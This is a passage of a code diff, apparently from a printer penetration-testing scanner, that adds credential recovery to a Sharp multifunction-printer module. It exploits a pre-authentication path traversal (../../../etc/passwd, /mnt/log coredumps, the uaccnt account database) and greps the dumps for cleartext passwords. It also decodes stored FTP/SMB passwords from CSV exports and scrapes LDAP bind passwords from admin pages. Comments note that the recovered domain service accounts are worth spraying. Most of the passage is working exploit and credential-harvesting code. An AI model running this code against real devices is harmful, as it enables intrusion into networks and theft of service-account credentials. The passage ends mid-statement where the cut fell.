@@ -20,12 +20,16 @@ Two things make Sharp different from Ricoh:
     scraped from the form immediately before posting, on the same session
     cookie. Replaying a stale token fails.
 """
+import base64
+import binascii
 import csv
 import html as html_module
 import io
 import os
 import re
+import zlib
 from typing import Dict, List, Optional, Tuple
+from urllib.parse import unquote_plus
 
 import requests
 from requests.exceptions import RequestException
@@ -37,6 +41,7 @@ from .base import (
     http_post,
     LoginResult,
     PrinterModule,
+    RecoveredCredential,
     ScanContext,
     Target,
     VulnFinding,
@@ -44,6 +49,7 @@ from .base import (
     log_response,
     page_title,
     parse_set_cookies,
+    printable_strings,
 )
 
 LOGIN_PATH = "/login.html"
@@ -82,7 +88,8 @@ EXPORT_TYPE_ADDRESS_BOOK = "33"     # the other option, 23, is User Register Inf
 # Each protocol spreads over a group of columns sharing a prefix; a row is a
 # folder destination when any of its location or credential columns is filled.
 # (label, prefix) - column names are matched case-insensitively as <prefix>-*.
-SCAN_FOLDER_PROTOCOLS = [("FTP", "ftp"), ("SMB", "smb"), ("NetFolder", "netfolder")]
+SCAN_FOLDER_PROTOCOLS = [("FTP", "ftp"), ("SMB", "smb"), ("Desktop", "desktop"),
+                         ("NetFolder", "netfolder")]
 _FOLDER_HOST_COLS = ("host", "server")
 _FOLDER_PATH_COLS = ("directory", "path", "folder")
 _FOLDER_USER_COLS = ("username", "user")
@@ -115,10 +122,11 @@ ADDRESS_BOOK_PATH = "/addressbook.html"
 # relative to /mnt/std_data, so a traversal of ../../../ hits the root of the
 # printer's filesystem. /etc/passwd is small, harmless, always present, and
 # unmistakable: a real device answers with a line starting root:...:0:0:. We
-# use that as the safest possible confirmation - it does not touch coredumps
-# (which carry cleartext user passwords) or the /mnt/std04/DBMS/uaccnt
-# configuration files (which are the pentester's real prize but also real
-# user data that we have no reason to persist in this scanner's output).
+# use that as the safest possible confirmation for the vulnerability check
+# itself: the probe proves traversal works without reading anything sensitive.
+# The coredumps under /mnt/log (cleartext user passwords) and the account
+# database under /mnt/std04/DBMS/uaccnt are read by the credential recovery
+# stage instead, and only when the operator opts in with --dump-coredumps.
 LFI_PATH = "/installed_emanual_down.html"
 LFI_PROBE_PATH_ARG = "/manual/../../../etc/passwd"
 _LFI_PASSWD_RE = re.compile(r"^root:[^:\n]*:0:0:", re.M)
@@ -151,6 +159,185 @@ AWS_POSTMAN_TOKEN = b"44688039-5104-39be-f974-c1f5ef621a5f"
 AWS_ANALYTICS_ENDPOINT = (
     b"7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics"
 )
+
+# ---------------------------------------------------------------------------
+# Credential recovery
+# ---------------------------------------------------------------------------
+# Detecting that a printer stores a scan-to-folder or LDAP bind password is
+# only half a finding. The credential is a real service account on the
+# client's network - usually one with write access to a file share, often a
+# domain account - so recovering it in cleartext is what turns "the MFP holds
+# a password" into "the MFP hands out a domain service account". Three
+# independent sources, cheapest first:
+#
+#   1. The address book CSV we already exported. Sharp ships the stored
+#      FTP/SMB/Desktop passwords in the export itself, alongside a companion
+#      "<field>/@encodingMethod" column naming how the value was encoded.
+#   2. The authenticated LDAP settings page, /nw_ldap_entry.html?ldapid=N.
+#   3. The pre-auth LFI, chained to the printer's coredumps. Per Pierre Kim's
+#      June 2024 advisory these are world-readable and hold cleartext
+#      passwords for every account "even when the admin user has not been
+#      logged-in the printer since the printer booted". This is the route that
+#      works when the default credentials have already been changed.
+
+# Sharp's CSV import/export declares an encoding per credential field rather
+# than committing to one, because the same file has to round-trip values that
+# are not valid CSV text. An empty method means the value is literal.
+_ENCODING_PLAIN = {"", "none", "plain", "text", "0"}
+_ENCODING_BASE64 = {"base64", "b64", "1"}
+_ENCODING_HEX = {"hex", "hexadecimal", "2"}
+
+# LDAP address book / authentication servers. The advisory drives this page
+# for CVE-2024-34162; we only read it. ldapid is a zero-based index and the
+# firmware exposes a handful of slots, so we walk until a slot comes back
+# without a usable form.
+LDAP_ENTRY_PATH = "/nw_ldap_entry.html"
+LDAP_MAX_ENTRIES = 6
+
+# Field-label heuristics for the LDAP settings form. The ggt_textbox() ids on
+# that page vary between firmware families, so classifying by the label the
+# device renders next to each box is more durable than pinning ids that only
+# hold on the one model we happened to test. Ordered: the first pattern that
+# matches a label wins, so "user name" is checked before the looser "name".
+_LDAP_FIELD_HINTS = (
+    ("password", ("password", "passwd", "pwd")),
+    ("username", ("user name", "username", "login name", "bind dn", "bind name",
+                  "account name", "user id")),
+    ("server", ("server name", "server address", "host name", "hostname",
+                "ldap server", "server")),
+    ("port", ("port",)),
+    ("search_root", ("search root", "search base", "base dn", "root dn",
+                     "search condition")),
+    ("domain", ("domain",)),
+    ("name", ("name",)),
+)
+_LDAP_INPUT_RE = re.compile(r"<input\b([^>]*)>", re.S | re.I)
+_LABEL_CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
+_LDAP_LABEL_WINDOW = 400
+
+# Coredumps, per the advisory: world-readable (-rw-r--r--) under /mnt/log,
+# gzip-compressed, and split into numbered parts (core-main.log.gz.001 was
+# 17,316,455 bytes on the reporter's MX-M6071). We try the split part first
+# because that is the name the advisory actually demonstrates, then the
+# unsplit and error variants.
+COREDUMP_DIR = "/manual/../../../mnt/log/"
+COREDUMP_FILES = (
+    "core-main.log.gz.001",
+    "core-main.log.gz",
+    "ERR_core-main.log.gz.001",
+    "ERR_core-main.log.gz",
+)
+# The user account database. Binary with embedded account-name strings; it
+# confirms which accounts exist on the device even when no coredump is present.
+UACCNT_FILES = (
+    "/manual/../../../mnt/std04/DBMS/uaccnt/9.01",
+    "/manual/../../../mnt/std04/DBMS/uaccnt/1.01",
+)
+
+# Structured markers inside a decompressed coredump. The main binary serves
+# the web UI, so login and settings POST bodies are still resident in the heap
+# it dumped. A hit on one of these is not a guess: it is the verbatim body of
+# a form submission, with the field name the device itself assigned. That is
+# what makes these 'verified' rather than 'candidate'.
+# A form value runs until the first byte that cannot be part of one. Spelt as
+# printable-ASCII-minus-delimiters rather than as a negated class: a coredump
+# puts no delimiter after the last field of a fragment - raw heap follows it -
+# so a class that permits high bytes swallows binary into the password.
+_FORM_VALUE = r"(?:(?![&\"'<>])[\x21-\x7e])"
+_MEM_LOGIN_PW_RE = re.compile(
+    (PASSWORD_FIELD.replace("(", r"\(").replace(")", r"\)")
+     + r"=(" + _FORM_VALUE + r"{1,64})").encode()
+)
+_MEM_LOGIN_USER_RE = re.compile(
+    (LOGIN_NAME_FIELD.replace("(", r"\(").replace(")", r"\)")
+     + r"=(" + _FORM_VALUE + r"{1,64})").encode()
+)
+# Everything else is a pattern match over unstructured memory, so it is
+# reported as a candidate. Keyed on the field/config name that precedes the
+# value, which is how both the CSV columns (ftp-password, smb-password) and
+# the device's own settings serialisation spell it.
+_MEM_KV_PW_RE = re.compile(
+    (r"(?i)\b([a-z0-9_.\-]{0,24}(?:password|passwd|bindpw|pwd))"
+     r"\s*[=:]\s*[\"']?((?:(?![&\"'<>,;])[\x21-\x7e]){3,64})").encode()
+)
+# Values the device stores as placeholders, format strings, or masks. None of
+# these is a password and every one of them shows up in a memory dump.
+_MEM_JUNK_VALUES = {
+    "null", "(null)", "nil", "none", "true", "false", "yes", "no", "0", "1",
+    "password", "passwd", "pwd", "xxxx", "****", "n/a", "undefined", "-",
+}
+_MEM_JUNK_RE = re.compile(r"^[\W_]+$|%[sdxu]|^\*+$|^x+$|^0x[0-9a-f]+$", re.I)
+
+
+def _label_before(page: str, position: int) -> str:
+    """
+    The label a settings page renders beside the input at ``position``.
+
+    Sharp lays these pages out as ``<td>Label</td><td><input ...></td>``, so the
+    last cell that *closed* before the input is the label for it. Taking a flat
+    tail of the preceding text instead runs backwards across the previous row -
+    which makes "Port Number" look like it says "Server Name", and quietly
+    misfiles every field after the first.
+    """
+    window = page[max(0, position - _LDAP_LABEL_WINDOW):position]
+    cells = _LABEL_CELL_RE.findall(window)
+    for _tag, raw in reversed(cells):
+        text = _cell_text(raw).strip().lower()
+        if text:
+            return text[:60]
+    return _cell_text(window).strip().lower()[-60:]
+
+
+def _decode_export_value(value: str, method: str) -> Tuple[str, str]:
+    """
+    Turn a CSV credential cell into cleartext, honouring the companion
+    "<field>/@encodingMethod" column.
+
+    Returns (cleartext, note). The note is empty when the value needed no
+    decoding or decoded cleanly; when the declared method is one we do not
+    know, the raw value is returned unchanged and the note says so, because a
+    password we cannot decode is still worth reporting verbatim - the operator
+    can decode it by hand rather than being told nothing was found.
+    """
+    raw = (value or "").strip()
+    if not raw:
+        return "", ""
+    how = (method or "").strip().strip('"').lower()
+
+    if how in _ENCODING_PLAIN:
+        return raw, ""
+    if how in _ENCODING_BASE64:
+        try:
+            decoded = base64.b64decode(raw + "=" * (-len(raw) % 4), validate=True)
+        except (binascii.Error, ValueError):
+            return raw, f"declared base64 but did not decode; value shown as stored"
+        return decoded.decode("utf-8", errors="replace"), ""
+    if how in _ENCODING_HEX:
+        try:
+            return bytes.fromhex(raw).decode("utf-8", errors="replace"), ""
+        except ValueError:
+            return raw, "declared hex but did not decode; value shown as stored"
+    return raw, f"unrecognised encodingMethod '{how}'; value shown as stored"
+
+
+def _looks_like_password(value: str) -> bool:
+    """Filter for values grepped out of unstructured memory."""
+    v = (value or "").strip()
+    if len(v) < 3 or len(v) > 64:
+        return False
+    if v.lower() in _MEM_JUNK_VALUES:
+        return False
+    if _MEM_JUNK_RE.search(v):
+        return False
+    # A run of memory that is one long word of hex or a path is far more likely
+    # to be a token, a filename, or a pointer than a stored password.
+    if v.startswith(("/", "\\", "http://", "https://")):
+        return False
+    if any(ord(ch) < 0x20 or ord(ch) > 0x7e for ch in v):
+        return False
+    return True
+
+
 _TABLE_RE = re.compile(r"<table[^>]*>(.*?)</table>", re.S | re.I)
 _ROW_RE = re.compile(r"<tr[^>]*>(.*?)</tr>", re.S | re.I)
 _CELL_RE = re.compile(r"<t([dh])[^>]*>(.*?)</t\1>", re.S | re.I)
@@ -351,6 +538,139 @@ def _render_binary_excerpts(target: Target, request_url: str, body: bytes,
     return "\n".join(header_lines + excerpts)
 
 
+def _gunzip_partial(raw: bytes) -> bytes:
+    """
+    Decompress a gzip stream that is very probably truncated.
+
+    Coredumps are split into numbered parts and we cap the download, so the
+    bytes in hand are almost never a complete member. gzip.decompress() throws
+    the whole thing away in that case; a raw decompressobj keeps everything it
+    managed to inflate before it ran out, which is the part we want. The output
+    is capped as well - a coredump is compressed memory and inflates hard.
+    """
+    ceiling = 512 * 1024 * 1024
+    out = bytearray()
+    obj = zlib.decompressobj(16 + zlib.MAX_WBITS)
+    try:
+        for i in range(0, len(raw), 1 << 20):
+            out.extend(obj.decompress(raw[i:i + (1 << 20)], ceiling - len(out)))
+            if len(out) >= ceiling or obj.eof:
+                break
+    except zlib.error:
+        pass    # truncated stream: keep whatever inflated cleanly
+    return bytes(out)
+
+
+_ROLE_SELECT_RE = re.compile(
+    (ROLE_SELECT_FIELD.replace("(", r"\(").replace(")", r"\)") + r"=(\d+)").encode()
+)
+# Role values as documented in the advisory and confirmed against the login
+# forms this module already drives. Anything else is reported by number rather
+# than guessed at.
+_ROLE_VALUE_NAMES = {"3": "Administrator", "4": "Service", "7": "FSS"}
+
+_HOST_NEAR_RE = re.compile(
+    rb"(?i)(?:\\\\[A-Za-z0-9_.\-]+(?:\\[A-Za-z0-9_.$\-]+)?"
+    rb"|(?:ftp|smb|ldaps?|cifs)://[A-Za-z0-9_.\-]+(?::\d+)?"
+    rb"|\b(?:\d{1,3}\.){3}\d{1,3}\b)"
+)
+_USER_NEAR_RE = re.compile(
+    rb"(?i)\b[a-z0-9_.\-]{0,16}(?:username|user|userid|uid|logon|account)"
+    rb"\s*[=:]\s*[\"']?([A-Za-z0-9_.\\@\-]{2,64})"
+)
+# LDAP binds as a distinguished name - "CN=svc-printer,OU=Service,DC=corp,DC=local" -
+# which the username pattern above truncates at the first '='.
+_BINDDN_NEAR_RE = re.compile(
+    rb"(?i)\b[a-z0-9.\-]{0,16}_?(?:binddn|bind_dn|bind-dn|bindname|bind_user|rootdn)"
+    rb"\s*[=:]\s*[\"']?((?:[A-Za-z]{1,4}=[^,\x00\r\n]{1,64})(?:,[A-Za-z]{1,4}=[^,\x00\r\n]{1,64}){0,12})"
+)
+# Hosts are far more reliably read from the device's own "<something>host=" /
+# "server=" serialisation than guessed at from bare dotted names, which in a
+# memory dump match filenames and version strings as readily as hostnames.
+_HOST_KV_RE = re.compile(
+    rb"(?i)\b[a-z0-9_.\-]{0,16}(?:host|server|address)"
+    rb"\s*[=:]\s*[\"']?([A-Za-z0-9][A-Za-z0-9_.\-]{1,79})"
+)
+# How far either side of a password hit we are willing to look for the host and
+# account it belongs to. Wide enough to span a settings record, narrow enough
+# that the association still means something.
+_NEIGHBOUR_WINDOW = 512
+
+
+def _role_from_post_body(window: bytes) -> str:
+    """Map the role value in a recovered login POST body to its account name."""
+    match = None
+    for match in _ROLE_SELECT_RE.finditer(window):
+        pass    # the closest preceding selection is the one that belongs to us
+    if not match:
+        return ""
+    value = match.group(1).decode()
+    return _ROLE_VALUE_NAMES.get(value, f"role {value}")
+
+
+def _nearest_host(blob: bytes, offset: int, scheme: str = "") -> str:
+    """
+    Best-effort host for a credential found in raw memory.
+
+    Association by proximity is a heuristic, which is exactly why every
+    finding that relies on it is reported as a candidate rather than verified.
+    """
+    window = blob[max(0, offset - _NEIGHBOUR_WINDOW):offset + _NEIGHBOUR_WINDOW]
+    matches = [m.group().decode("ascii", errors="replace") for m in _HOST_NEAR_RE.finditer(window)]
+    if scheme:
+        preferred = [m for m in matches if m.lower().startswith(scheme)]
+        if preferred:
+            return preferred[0]
+    if matches:
+        return matches[0]
+    keyed = _HOST_KV_RE.search(window)
+    return keyed.group(1).decode("ascii", errors="replace") if keyed else ""
+
+
+def _nearest_username(blob: bytes, offset: int) -> str:
+    """The account name sitting nearest a password hit, or a placeholder."""
+    window = blob[max(0, offset - _NEIGHBOUR_WINDOW):offset + _NEIGHBOUR_WINDOW]
+    match = _BINDDN_NEAR_RE.search(window) or _USER_NEAR_RE.search(window)
+    if not match:
+        return "(username not recovered)"
+    return unquote_plus(match.group(1).decode("ascii", errors="replace"))
+
+
+def _render_credential_evidence(target: Target, source_file: str,
+                                creds: List["RecoveredCredential"]) -> str:
+    """
+    Proof-of-concept artifact for credentials recovered out of device memory.
+
+    Records the request that produced the dump and, per credential, the byte
+    offset it was found at and the confidence it carries, so the client can
+    reproduce the recovery rather than take the tool's word for it.
+    """
+    lines = [
+        "# Sharp MFP recovered-credential evidence",
+        f"# Target: {target.base_url}",
+        f"# Source: GET {LFI_PATH}?path={COREDUMP_DIR}{source_file}"
+        if source_file else "# Source: device settings pages",
+        "# Reference: Pierre Kim, \"Sharp MFP - 17 vulnerabilities\", 2024-06-27",
+        "#",
+        "# WARNING: this file contains live credentials for the client's network.",
+        "# Handle it as evidence, store it with the engagement, and destroy it on close.",
+        "#",
+        "# --- recovered credentials follow ---",
+        "",
+    ]
+    for cred in creds:
+        lines.extend([
+            f"## [{cred.confidence}] {cred.kind}",
+            f"   scope:    {cred.scope}",
+            f"   username: {cred.username}",
+            f"   password: {cred.password}",
+            f"   source:   {cred.source}",
+            f"   detail:   {cred.detail}",
+            "",
+        ])
+    return "\n".join(lines)
+
+
 def _hexdump(data: bytes, base: int = 0) -> str:
     """`xxd`-style dump: `offset  <32 hex>  <16 ascii>` per row."""
     rows: List[str] = []
@@ -413,6 +733,7 @@ class SharpModule(PrinterModule):
     supports_export = True
     supports_scrape = True
     supports_vuln_checks = True
+    supports_credential_recovery = True
     export_note = (
         "Exports via System Settings > Data Import/Export (CSV). The CSV carries stored "
         "FTP/SMB credentials for scan-to-folder destinations as well as contacts."
@@ -922,8 +1243,14 @@ class SharpModule(PrinterModule):
         Columns are grouped by protocol prefix (ftp-*, smb-*, ...) and located by
         name, since firmware only emits the groups for destination types the
         device actually supports. A row counts as a folder destination once any
-        host, path, or username column for a protocol is populated; the stored
-        password is reported only as present/absent, never echoed.
+        host, path, or username column for a protocol is populated.
+
+        The stored password is carried out in cleartext. Sharp exports it in
+        the "<proto>-password" column with a companion
+        "<proto>-password/@encodingMethod" column naming the encoding, so the
+        value is decoded here rather than left for someone to work out by hand
+        later. ``has_password`` is still reported for callers that only want
+        the presence signal.
         """
         content = (text or "").lstrip("\ufeff")
         if not content.strip():
@@ -939,7 +1266,10 @@ class SharpModule(PrinterModule):
         index = {name: i for i, name in enumerate(header)}
 
         def cell(row: List[str], column: str) -> str:
-            i = index.get(column)
+            # The header index is lower-cased, so the lookup has to be too:
+            # the companion column is spelled "<field>/@encodingMethod" and
+            # would otherwise never match.
+            i = index.get(column.lower())
             if i is None or i >= len(row):
                 return ""
             return row[i].strip()
@@ -951,6 +1281,21 @@ class SharpModule(PrinterModule):
                     return value
             return ""
 
+        def first_with_column(row: List[str], prefix: str,
+                              suffixes: Tuple[str, ...]) -> Tuple[str, str]:
+            """
+            As first(), but also returns the column name that produced the
+            value - the encodingMethod column is named after it
+            ("ftp-password" -> "ftp-password/@encodingMethod"), so the caller
+            cannot look up the encoding without knowing which column hit.
+            """
+            for suffix in suffixes:
+                column = f"{prefix}-{suffix}"
+                value = cell(row, column)
+                if value:
+                    return value, column
+            return "", ""
+
         findings: List[Dict[str, str]] = []
         for row in rows[1:]:
             entry_name = cell(row, "name")
@@ -960,14 +1305,19 @@ class SharpModule(PrinterModule):
                 user = first(row, prefix, _FOLDER_USER_COLS)
                 if not (host or path or user):
                     continue
-                password = first(row, prefix, _FOLDER_PASS_COLS)
+                stored, column = first_with_column(row, prefix, _FOLDER_PASS_COLS)
+                encoding = cell(row, f"{column}/@encodingMethod") if column else ""
+                password, note = _decode_export_value(stored, encoding)
                 findings.append({
                     "name": entry_name,
                     "protocol": label,
                     "host": host,
                     "path": path,
                     "username": user,
-                    "has_password": "yes" if password else "no",
+                    "has_password": "yes" if stored else "no",
+                    "password": password,
+                    "password_encoding": encoding,
+                    "password_note": note,
                 })
         return findings
 
@@ -1176,10 +1526,11 @@ class SharpModule(PrinterModule):
         segments preceding /manual/. ``GET /installed_emanual_down.html?path=
         /manual/../../../etc/passwd`` returns the printer's Linux passwd file
         without a session cookie. We probe with /etc/passwd because it is small,
-        harmless, unmistakably formatted, and never contains user data - we
-        specifically do NOT reach for /mnt/log/core-main.log.gz.001 (coredumps
-        holding cleartext user passwords) or /mnt/std04/DBMS/uaccnt (user
-        credential database), which is where the real attack goes.
+        harmless, unmistakably formatted, and never contains user data. Proving
+        the vulnerability is all this check does: /mnt/log/core-main.log.gz.001
+        (coredumps holding cleartext user passwords) and /mnt/std04/DBMS/uaccnt
+        (the user credential database) are where the attack actually goes, and
+        reading them belongs to recover_credentials(), behind --dump-coredumps.
 
         On a hit, the exact response body is persisted to disk as the client's
         proof-of-concept artifact.
@@ -1241,6 +1592,434 @@ class SharpModule(PrinterModule):
                 "Reference: Pierre Kim, \"Sharp MFP - 17 vulnerabilities\", 2024-06-27."
             ),
         )
+
+    # ---- credential recovery -------------------------------------------
+
+    def recover_credentials(self, target: Target, ctx: ScanContext,
+                            login_result: Optional[LoginResult] = None,
+                            export_text: str = "",
+                            include_coredumps: bool = False) -> List[RecoveredCredential]:
+        """
+        Recover the credentials this device stores, in cleartext.
+
+        Three sources, run cheapest first and independently - a device that
+        blocks one still gives up the others:
+
+          1. **The address book CSV** already pulled in the harvest stage.
+             Sharp exports the stored FTP/SMB/Desktop passwords for every
+             scan-to-folder destination, encoded per the companion
+             ``@encodingMethod`` column. No extra request.
+          2. **The LDAP settings page** (``/nw_ldap_entry.html?ldapid=N``),
+             read with the administrator session when we have one. Yields the
+             directory server, the bind account, and - on firmware that
+             renders stored values back into the form - the bind password.
+          3. **The printer's coredumps**, through the pre-auth LFI. Per the
+             June 2024 advisory these are world-readable under /mnt/log and
+             hold cleartext passwords for every account. This is the source
+             that still works when the default credentials have been changed
+             and no session was obtained at all - and the reason it is
+             ``include_coredumps``-gated: sources 1 and 2 read back a
+             credential the device was configured to store, while this one
+             returns whatever passwords happen to be resident in memory,
+             including those of users who merely logged in.
+
+        Every returned credential is labelled ``verified`` (it came out of a
+        field whose meaning is unambiguous), ``candidate`` (a pattern match
+        over raw memory), or ``config-only`` (the account and where it points
+        were recovered, the password was not).
+        """
+        recovered: List[RecoveredCredential] = []
+
+        stages = [
+            lambda: self._recover_from_export(target, export_text),
+            lambda: self._recover_ldap_settings(target, ctx, login_result),
+        ]
+        if include_coredumps:
+            stages.append(lambda: self._recover_from_memory(target, ctx))
+
+        for stage in stages:
+            try:
+                recovered.extend(stage())
+            except Exception as exc:
+                # One unhappy device must not cost the operator the other two
+                # sources, nor take the scan down.
+                if ctx.verbose:
+                    print(f"[SHARP RECOVERY] {target.hostport}: stage failed - "
+                          f"{exc.__class__.__name__}: {exc}")
+
+        return self._dedupe_credentials(recovered)
+
+    @staticmethod
+    def _dedupe_credentials(items: List[RecoveredCredential]) -> List[RecoveredCredential]:
+        """
+        Collapse the same credential arriving from more than one source.
+
+        A scan-to-folder password can turn up in both the CSV and the coredump;
+        reporting it twice pads the findings file without adding information.
+        Keyed on the triple that makes a credential distinct, and the better
+        confidence wins so a structured hit is never demoted by a memory grep.
+        """
+        rank = {"verified": 3, "candidate": 2, "config-only": 1}
+        best: Dict[Tuple[str, str, str], RecoveredCredential] = {}
+        for item in items:
+            key = (item.kind, item.username.lower(), item.password)
+            current = best.get(key)
+            if current is None or rank.get(item.confidence, 0) > rank.get(current.confidence, 0):
+                best[key] = item
+
+        # A config-only row says "this account exists here, the password did not
+        # come back". Once another source has produced that same account's
+        # password, the config-only row is only noise in the findings file, so
+        # fold its detail into the row that carries the secret and drop it.
+        with_password = {
+            (item.kind, item.username.lower())
+            for item in best.values() if item.password
+        }
+        merged: List[RecoveredCredential] = []
+        for item in best.values():
+            identity = (item.kind, item.username.lower())
+            if not item.password and identity in with_password:
+                for other in best.values():
+                    if (other.kind, other.username.lower()) == identity and other.password:
+                        extra = f"config from {item.source}: {item.detail}" if item.detail else ""
+                        if extra and extra not in other.detail:
+                            other.detail = f"{other.detail}; {extra}" if other.detail else extra
+                        # The settings page is the authority on where the
+                        # account is actually used; a memory hit only guessed.
+                        if item.scope and item.scope.startswith("ldap://"):
+                            other.scope = item.scope
+                        break
+                continue
+            merged.append(item)
+        return merged
+
+    def _recover_from_export(self, target: Target,
+                             export_text: str) -> List[RecoveredCredential]:
+        """
+        Lift the scan-to-folder credentials straight out of the exported CSV.
+
+        These are the ones worth having: a scan-to-folder destination exists so
+        the MFP can write into a share unattended, which means the account is
+        real, it is usually a service account, and it usually has write access.
+        """
+        out: List[RecoveredCredential] = []
+        for folder in self.extract_scan_to_folder(export_text):
+            password = folder.get("password") or ""
+            username = folder.get("username") or ""
+            if not (password or username):
+                continue
+
+            host = (folder.get("host") or "").rstrip("/")
+            path = (folder.get("path") or "").lstrip("/")
+            protocol = folder.get("protocol") or "folder"
+            if host and path:
+                scope = f"{protocol.lower()}://{host}/{path}"
+            elif host:
+                scope = f"{protocol.lower()}://{host}"
+            else:
+                scope = path or "(destination on this device)"
+
+            detail_bits = [f"address book entry '{folder.get('name') or '(unnamed)'}'"]
+            if folder.get("password_encoding"):
+                detail_bits.append(f"stored with encodingMethod="
+                                   f"{folder['password_encoding']}")
+            if folder.get("password_note"):
+                detail_bits.append(folder["password_note"])
+
+            out.append(RecoveredCredential(
+                kind="scan-to-folder",
+                scope=scope,
+                username=username,
+                password=password,
+                source=(f"{protocol} destination in the address book CSV exported through "
+                        f"System Settings > Data Import/Export on {target.hostport}"),
+                detail="; ".join(detail_bits),
+                confidence="verified" if password else "config-only",
+            ))
+        return out
+
+    def _recover_ldap_settings(self, target: Target, ctx: ScanContext,
+                               login_result: Optional[LoginResult]) -> List[RecoveredCredential]:
+        """
+        Read the configured LDAP servers off /nw_ldap_entry.html?ldapid=N.
+
+        Needs an administrator session, so this stage is skipped silently when
+        the default credentials did not work - the coredump route covers that
+        case instead. Fields are classified by the label the device renders
+        beside each box rather than by ggt_textbox() id, because the ids move
+        between firmware families while the labels do not.
+        """
+        if not (login_result and login_result.ok):
+            return []
+        session = login_result.session or {}
+        cookies = session.get("cookies") or {}
+        if not cookies:
+            return []
+        base_url = session.get("base_url", target.base_url)
+
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Referer": f"{base_url}/network.html",
+        }
+
+        out: List[RecoveredCredential] = []
+        for ldap_id in range(LDAP_MAX_ENTRIES):
+            url = f"{base_url}{LDAP_ENTRY_PATH}?ldapid={ldap_id}"
+            log_request(ctx, "SHARP LDAP SETTINGS", target.hostport, "GET", url,
+                        headers, cookies)
+            try:
+                resp = http_get(url, ctx, headers=headers, cookies=cookies,
+                                allow_redirects=False)
+            except RequestException:
+                break
+            log_response(ctx, "SHARP LDAP SETTINGS RESPONSE", target.hostport,
+                         resp, body_limit=400)
+            if resp.status_code != 200:
+                break
+            page = resp.text or ""
+            if PASSWORD_FIELD in page or page_title(page).lower().startswith("login"):
+                # Session expired or this account cannot reach network settings.
+                break
+
+            entry = self._parse_ldap_entry(page)
+            server = entry.get("server", "")
+            username = entry.get("username", "")
+            password = entry.get("password", "")
+            if not (server or username or password):
+                continue
+
+            port = entry.get("port", "") or "389"
+            scope = f"ldap://{server}:{port}" if server else "(LDAP server on this device)"
+            detail_bits = [f"ldapid={ldap_id}"]
+            for key in ("name", "search_root", "domain"):
+                if entry.get(key):
+                    detail_bits.append(f"{key.replace('_', ' ')}={entry[key]}")
+            if not password:
+                detail_bits.append(
+                    "bind password is not rendered into the settings form on this "
+                    "firmware - recover it from the coredump stage or with the "
+                    "CVE-2024-34162 SIMPLE downgrade"
+                )
+
+            out.append(RecoveredCredential(
+                kind="LDAP",
+                scope=scope,
+                username=username,
+                password=password,
+                source=(f"LDAP settings page {LDAP_ENTRY_PATH}?ldapid={ldap_id} read with the "
+                        f"'{login_result.account.label}' session on {target.hostport}"),
+                detail="; ".join(detail_bits),
+                confidence="verified" if password else "config-only",
+            ))
+        return out
+
+    def _parse_ldap_entry(self, page: str) -> Dict[str, str]:
+        """
+        Classify the inputs on an LDAP settings page by their rendered label.
+
+        Two ways a stored value reaches the browser, and both are read:
+        a ``value="..."`` attribute on the input, and - on firmware that
+        populates the form from script instead - an assignment to the field
+        name inside a <script> block.
+        """
+        entry: Dict[str, str] = {}
+        for match in _LDAP_INPUT_RE.finditer(page):
+            attrs = _attrs(match.group(1))
+            name = attrs.get("name") or attrs.get("id") or ""
+            if not name:
+                continue
+
+            label = _label_before(page, match.start())
+
+            role = ""
+            if attrs.get("type", "").lower() == "password":
+                role = "password"
+            else:
+                for candidate, hints in _LDAP_FIELD_HINTS:
+                    if any(hint in label for hint in hints):
+                        role = candidate
+                        break
+            if not role or role in entry:
+                continue
+
+            value = attrs.get("value", "")
+            if not value:
+                js = re.search(re.escape(name) + r"[^\n=]{0,40}=\s*\"([^\"]*)\"", page)
+                if js:
+                    value = js.group(1)
+            value = html_module.unescape(value).strip()
+            if value:
+                entry[role] = value
+        return entry
+
+    def _lfi_read(self, target: Target, ctx: ScanContext, path_arg: str,
+                  max_bytes: int, tag: str) -> Optional[bytes]:
+        """
+        Fetch one file through the pre-auth LFI. Returns the bytes, or None on
+        anything that is not a 200 with a body.
+        """
+        url = f"{target.base_url}{LFI_PATH}?path={path_arg}"
+        headers = {
+            "User-Agent": BROWSER_UA,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Connection": "close",
+        }
+        log_request(ctx, tag, target.hostport, "GET", url, headers)
+        try:
+            resp = http_get(url, ctx, headers=headers, allow_redirects=False,
+                            max_bytes=max_bytes, timeout=ctx.export_timeout)
+        except RequestException:
+            return None
+        log_response(ctx, f"{tag} RESPONSE", target.hostport, resp, body_limit=80)
+        if resp.status_code != 200:
+            return None
+        body = resp.content or b""
+        return body or None
+
+    def _recover_from_memory(self, target: Target,
+                             ctx: ScanContext) -> List[RecoveredCredential]:
+        """
+        Pull cleartext credentials out of the printer's coredumps.
+
+        The advisory's finding is that /mnt/log holds world-readable gzipped
+        coredumps of the main binary, and that the binary keeps credentials in
+        the clear - the reporter recovered an administrator password that had
+        never been used since boot. The main binary is also the web server, so
+        form POST bodies are resident too, which is what makes the strongest
+        hits here structured rather than guessed.
+
+        Runs only after the /etc/passwd probe confirms traversal works, so a
+        patched device costs one small request rather than a 17 MB download.
+        """
+        if not self._lfi_read(target, ctx, LFI_PROBE_PATH_ARG, 32 * 1024,
+                              "SHARP RECOVERY LFI PRECHECK"):
+            return []
+
+        blob = b""
+        source_file = ""
+        for filename in COREDUMP_FILES:
+            raw = self._lfi_read(target, ctx, f"{COREDUMP_DIR}{filename}",
+                                 ctx.recovery_max_bytes, "SHARP COREDUMP READ")
+            if not raw:
+                continue
+            data = _gunzip_partial(raw) if raw[:2] == b"\x1f\x8b" else raw
+            if len(data) < 4096:
+                continue
+            blob, source_file = data, filename
+            break
+
+        creds: List[RecoveredCredential] = self._scan_memory(target, blob, source_file) if blob else []
+
+        # The account database names the accounts that exist on the device even
+        # when no coredump is present, which tells the operator which of the
+        # recovered passwords is worth spraying and which accounts to check by
+        # hand.
+        # Only worth two more requests when there is something to annotate.
+        accounts_seen = self._read_account_names(target, ctx) if creds else []
+        if accounts_seen:
+            note = "device accounts present per /mnt/std04/DBMS/uaccnt: " + ", ".join(accounts_seen)
+            for cred in creds:
+                if cred.kind == "device account":
+                    cred.detail = f"{cred.detail}; {note}" if cred.detail else note
+
+        if creds:
+            evidence = _render_credential_evidence(target, source_file, creds)
+            path = _write_evidence(ctx, target, "evidence_recovered_credentials",
